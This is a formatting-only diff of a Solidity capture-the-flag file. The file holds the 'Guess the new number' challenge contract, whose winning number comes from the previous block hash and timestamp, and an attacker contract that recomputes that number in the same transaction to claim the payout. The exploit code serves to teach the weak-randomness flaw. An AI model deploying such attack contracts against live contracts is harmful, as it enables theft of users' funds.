@@ -13,16 +13,17 @@ contract GuessTheNewNumberChallenge {
         return address(this).balance == 0;
     }
 
-    function guess(uint8 n) public payable { 
+    function guess(uint8 n) public payable {
         require(msg.value == 1 ether);
- 
+
         uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
- 
-        if (n == answer) { 
+
+        if (n == answer) {
             msg.sender.transfer(2 ether);
         }
     }
 }
+
 /*
 Solution: Compute number in the same transaction.
 */
@@ -33,10 +34,11 @@ contract GuessTheNewNumberChallengeAttacker {
         victim = _victim;
     }
 
-    function attack() payable external {
-        GuessTheNewNumberChallenge(victim).guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
+    function attack() external payable {
+        GuessTheNewNumberChallenge(victim).guess.value(msg.value)(
+            uint8(keccak256(block.blockhash(block.number - 1), now))
+        );
     }
 
-    function() payable public {
-    }
+    function() public payable {}
 }
